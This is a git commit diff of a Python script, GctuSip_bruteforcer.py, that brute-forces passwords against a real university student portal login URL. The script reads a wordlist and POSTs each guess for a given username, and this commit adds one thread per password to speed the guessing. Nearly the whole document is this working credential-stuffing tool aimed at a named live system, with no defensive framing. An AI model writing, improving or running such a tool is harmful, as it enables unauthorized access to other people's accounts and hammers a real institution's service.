eada5fac1d6944e8a5ed3bedf4426c902ebe0867
0xmk4y <bismarck.a360@gmail.com>
2023-01-11 19:17:19 +0000

    finish addind threading

--- GctuSip_bruteforcer.py
+++ GctuSip_bruteforcer.py
@@ -1,18 +1,7 @@
-'''
-
-Tite: GctuSip_bruteforcer.py
-Author: Bismark Aryeetey
-Date: 5 December 2022
-
-Usage:
-[+]clone this repo by run < git clone https://erp.gctu.edu.gh/sip/auth/login.php > in terminal
-[+]cd GctuSip_bruteforcer/
-[+]run: python GctuSip_bruteforcer.py -u <username> -w <wordlist>
-
-'''
 import requests
 import argparse
-
+import threading
+import time
 
 parser = argparse.ArgumentParser()
 parser.add_argument('--username','-u', type=str, required=True)
@@ -20,28 +9,35 @@ parser.add_argument('--wordlist','-w', type=str, required=True)
 
 args = parser.parse_args()
 
-
 username = args.username
 wordlists_path = args.wordlist
 url = 'https://erp.gctu.edu.gh/sip/auth/login.php'
 
 
+def check_password(passwd):
+    data = {'username': username, 'password': passwd}
+    r = requests.post(url, data=data)
+    if r.text == 'ok':
+        print("Password found:%s" % (passwd))
+    else:
+        print("[*]checking %s with username:%s and password:%s" % (url, username, passwd))
+
+start = time.perf_counter()
 
 #reading wordlist file
 with open(wordlists_path) as wordlists:
     try:
+        threads = []
         for passwd in wordlists.readlines():
             passwd = passwd.strip('\n')
-            data = {'username':username, 'password':passwd}
-            r = requests.post(url, data=data)
-            if r.text == 'ok':
-                print("Password found:%s" %(passwd))
-                break
-            else:
-                print("[*]checking %s with username:%s and password:%s" %(url, username, passwd) )
+            t = threading.Thread(target=check_password, args=(passwd,))
+            threads.append(t)
+            t.start()
+        for t in threads:
+            t.join()
     except KeyboardInterrupt:
         print("[+]Quitting... ")
 
 
-
-#https://play.picoctf.org/login
+finish = time.perf_counter()
+print(f"time taken: {finish - start}")
